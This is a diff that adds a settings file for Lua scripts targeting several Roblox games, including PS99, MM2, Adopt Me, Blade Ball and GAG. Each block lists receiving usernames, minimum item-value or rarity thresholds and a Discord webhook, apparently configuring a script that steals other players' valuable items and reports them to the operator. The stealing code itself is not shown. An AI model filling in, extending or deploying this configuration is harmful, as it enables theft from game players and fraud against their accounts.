@@ -1,0 +1,41 @@
+Pets Go settings:
+_G.Usernames = {"user1", "user2", "user3"} -- you can add as many as you'd like
+_G.min_rap = 10000
+_G.min_chance = 1000000
+_G.webhook = "https://discord.com/api/webhooks/" -- change to your webhook
+
+PS99 settings:
+_G.Usernames = {"user1", "user2", "user3"} -- you can add as many as you'd like
+_G.minrap = 10000000
+_G.webhook = "https://discord.com/api/webhooks/" -- change to your webhook
+
+MM2 settings:
+_G.Usernames = {"user1", "user2", "user3"} -- you can add as many as you'd like
+_G.min_rarity = "Godly"
+_G.min_value = 1 -- Put 1 to get all
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/" -- change to your webhook
+
+Adopt Me settings:
+_G.Usernames = {"user1", "user2", "user3"} -- you can add as many as you'd like
+_G.min_value = 0.1
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/" -- change to your webhook
+
+Blade Ball settings:
+_G.Usernames = {"user1", "user2", "user3"} -- you can add as many as you'd like
+_G.min_rap = 100
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/" -- change to your webhook
+
+BGSI settings:
+_G.Usernames = {"user1", "user2", "user3"} -- you can add as many as you'd like
+_G.min_value = 50 -- bgsi.gg is used for values
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/" -- change to your webhook
+
+GAG settings:
+_G.Usernames = {"user1", "user2", "user3"} -- you can add as many as you'd like
+_G.min_value = 100000000 -- 100 million
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/" -- change to your webhook
